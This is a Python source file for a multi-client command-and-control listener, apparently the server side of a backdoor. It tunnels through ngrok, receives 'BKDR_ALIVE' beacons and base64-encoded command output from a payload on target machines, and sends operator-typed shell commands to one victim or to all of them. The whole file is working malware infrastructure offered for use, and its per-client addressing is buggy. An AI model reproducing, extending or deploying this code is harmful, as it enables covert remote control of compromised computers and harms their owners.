"""
Listener starts by using ngrok tcp 4444 to create a tunnel to the targets machine. 
It then listens for incoming connections on the specified port and handles them accordingly.

"""

import socket
import threading
import base64



# Define IP and port to listen on
IP = "0.0.0.0" # Host IP
PORT = 4444 # Port for conenction

# Dictionary to store connected clients
clients = {}

# Function to handle incoming client connections
# This function will be responsible for receiving data from the client and processing it as needed
# Precondition: There is an incoming client connection to the listener.
# Postcondition: The function will receive data from the client, anad handle it accordingly. 

def handle_client(client_socket, client_address):
    print(f'[*] Connection made with: {client_address}')
    clients[client_address] = client_socket   # Store client for sending commands

    try:
        while True:
            data = client_socket.recv(4096)
            if not data:
                break

            request = data.decode('utf-8', errors='ignore').strip()

            # Handle command results from payload
            if request.startswith("CMD_RES|"):
                try:
                    encoded = request[8:]  # Remove "CMD_RES|"
                    decoded_bytes = base64.b64decode(encoded)
                    real_output = decoded_bytes.decode('utf-8')
                    print(f"\n[+] Command Output from {client_address}:")
                    print(real_output)
                    print("-" * 60)   # separator line
                except Exception as decode_error:
                    print(f"[!] Failed to decode output: {decode_error}")
                    print(f"Raw: {request}")

            # Handle error messages from payload
            elif request.startswith("CMD_ERR|"):
                error_msg = request[8:]
                print(f"[!] Command Error from {client_address}: {error_msg}")

            # Handle beacon
            elif request.startswith("BKDR_ALIVE|"):
                print(f"[+] Beacon received from {client_address}: {request}")

            # Everything else (including the old cwd message)
            else:
                print(f'[*] Received from {client_address}: {request}')

    except Exception as e:
        print(f'[!] Error with {client_address}: {e}')
    finally:
        client_socket.close()
        if client_address in clients:
            del clients[client_address]
        print(f'[*] Client {client_address} disconnected. Remaining: {len(clients)}')

# Create a TCP server (listener) and bind it to the specified IP and port
# Identify all connected target cients in the dictionary for accessability
# Listen on port for client connections, then use a thread (from threading library) to handle them simultaneously
# All connected clients will be stored in a dictionary for easy access and management
# The handle_client function will be responsible for receiving data from the client and processing it as needed
# Precondition: The listener is set up and running in python as well as ngrok is activated to create a tunnel to the target machine.
# Postcondition: The listener will be able to handle multiple client connections simultaneously 
# and print the received data from each client.
# 
def start_listener():
  # Creates a TCP server and bind it to IP and PORT
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
    listener.bind((IP, PORT))
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.listen()

    # Prints connection
    print(f'[*] Server listening on {IP}:{PORT}')

    while True:
      sock, addr = listener.accept() # Accept client connection
      handle_thread = threading.Thread(target = handle_client, args = (sock, addr), daemon = True) # Create new thread to handle connection
      handle_thread.start() # Start thread to handle the client connection 
      
      clients[addr] = sock # Store client connection in dictionary

      print(f'[*] Number of connected clients: {len(clients)}') # Print number of connected clients









# Run starat_listener
if __name__ == "__main__":
  print("[*] Starting listener...") # Print a message indicating that the listener is starting
  print("Commands Inputs: 'exit' to close connection with a client")
  print("/[address] [command] to send a command to a specific client")
  print("/all [command] to send a command to all clients")
  #Creates a thread to run start_listener in the background
  starter_thread = threading.Thread(target = start_listener, daemon = True) 
  starter_thread.start()
  while True: 
    cmd = input("Enter command to send to clients: ") # Prompt user to enter a command
    # Check for / command to send to clients
    if (cmd[0]== '/'):
      if (cmd[1:4] == "all"):
        command = cmd[5:] # Extract command from input

        for client in clients.values(): 
          client.send(command.encode("utf-8")) # Send command to each client
      else:
        address, command = cmd[1:].split(" ", 1) # Extract address and command from input
        if address in clients: 
          clients[address].send(command.encode("utf-8")) 
        else:
          print(f'[*] No client found with address {address}') # Print a message indicating that no client was found with specified address

    else: continue
    pass # Keep main thread running to allow listener to continue accepting connections





